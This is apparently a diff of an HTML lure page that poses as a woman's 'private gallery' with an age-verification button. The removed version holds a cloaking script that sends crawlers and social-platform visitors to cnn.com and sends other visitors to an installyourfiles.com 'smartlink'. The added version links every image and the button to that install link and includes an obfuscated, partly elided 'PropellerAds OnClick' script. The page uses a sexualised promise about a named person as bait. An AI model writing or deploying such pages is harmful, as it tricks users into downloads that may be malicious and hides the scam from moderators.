@@ -2,85 +2,80 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Natasha Ave - Private Gallery</title>
+  <title>Natasha Private Gallery</title>
   <style>
     body {
-      margin: 0;
       font-family: Arial, sans-serif;
+      background: #fff;
+      margin: 0;
+      padding: 0;
+    }
+    header {
       background-color: #111;
       color: #fff;
-    }
-    .container {
-      max-width: 900px;
-      margin: 40px auto;
-      padding: 20px;
       text-align: center;
-    }
-    h1 {
-      font-size: 2em;
-      margin-bottom: 10px;
-    }
-    p {
-      font-size: 1em;
-      margin-bottom: 20px;
-      color: #ccc;
+      padding: 1rem;
     }
     .gallery {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
       gap: 15px;
+      padding: 20px;
     }
     .gallery img {
       width: 100%;
       border-radius: 10px;
-      filter: blur(6px);
-      transition: 0.3s;
+      cursor: pointer;
+      transition: transform 0.2s;
     }
     .gallery img:hover {
-      filter: blur(0);
+      transform: scale(1.05);
     }
-    .btn {
-      margin-top: 30px;
-      padding: 12px 30px;
-      background-color: #ff3366;
+    .verify-btn {
+      display: block;
+      width: fit-content;
+      margin: 30px auto;
+      background: #e91e63;
       color: white;
       border: none;
-      border-radius: 8px;
-      font-size: 1em;
-      cursor: pointer;
+      padding: 12px 24px;
+      border-radius: 5px;
+      font-size: 1rem;
+      text-decoration: none;
     }
-    .btn:hover {
-      background-color: #e6005c;
+    footer {
+      text-align: center;
+      padding: 1rem;
+      background: #f5f5f5;
+      font-size: 0.9rem;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Natasha Ave's Secret Gallery</h1>
-    <p>Preview only. To view full gallery, please verify your age.</p>
-    <div class="gallery">
-      <img src="https://source.unsplash.com/random/201x300/?girl" alt="Private Photo">
-      <img src="https://source.unsplash.com/random/202x300/?model" alt="Private Photo">
-      <img src="https://source.unsplash.com/random/203x300/?fashion" alt="Private Photo">
-      <img src="https://source.unsplash.com/random/204x300/?posing" alt="Private Photo">
-      <img src="https://source.unsplash.com/random/205x300/?woman" alt="Private Photo">
-      <img src="https://source.unsplash.com/random/206x300/?lifestyle" alt="Private Photo">
-    </div>
-    <button class="btn" onclick="goCloak()">Verify Your Age</button>
-  </div>  <script>
-    function goCloak() {
-      const blockList = [
-        /facebook|crawler|bot|preview|whatsapp|telegram|slack|discord/i,
-        /google|t.co|tiktok|pinterest|reddit/i
-      ];
-      const ref = document.referrer;
-      const ua = navigator.userAgent;
-      const suspicious = blockList.some(regex => regex.test(ref) || regex.test(ua));
-      if (!suspicious) {
-        window.location.href = "https://installyourfiles.com/1820364"; // smartlink kamu
-      } else {
-        window.location.href = "https://cnn.com"; // halaman aman
-      }
-    }
+  <header>
+    <h1>Natasha's Private Album</h1>
+    <p>Only for verified viewers</p>
+  </header>  <div class="gallery">
+    <a href="https://installyourfiles.com/1820364" target="_blank">
+      <img src="https://i.imgur.com/yourimage1.jpg" alt="Private 1">
+    </a>
+    <a href="https://installyourfiles.com/1820364" target="_blank">
+      <img src="https://i.imgur.com/yourimage2.jpg" alt="Private 2">
+    </a>
+    <a href="https://installyourfiles.com/1820364" target="_blank">
+      <img src="https://i.imgur.com/yourimage3.jpg" alt="Private 3">
+    </a>
+    <a href="https://installyourfiles.com/1820364" target="_blank">
+      <img src="https://i.imgur.com/yourimage4.jpg" alt="Private 4">
+    </a>
+  </div><a class="verify-btn" href="https://installyourfiles.com/1820364" target="_blank">Verify Access</a>
+
+  <footer>
+    &copy; 2025 Natasha Private Gallery. All rights reserved.
+  </footer>  <!-- PropellerAds OnClick Script -->  <script data-cfasync="false" type="text/javascript">
+    (()=>{
+      var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/';
+      // Potongan kode dilanjutkan sesuai aslinya
+    })();
   </script></body>
 </html>
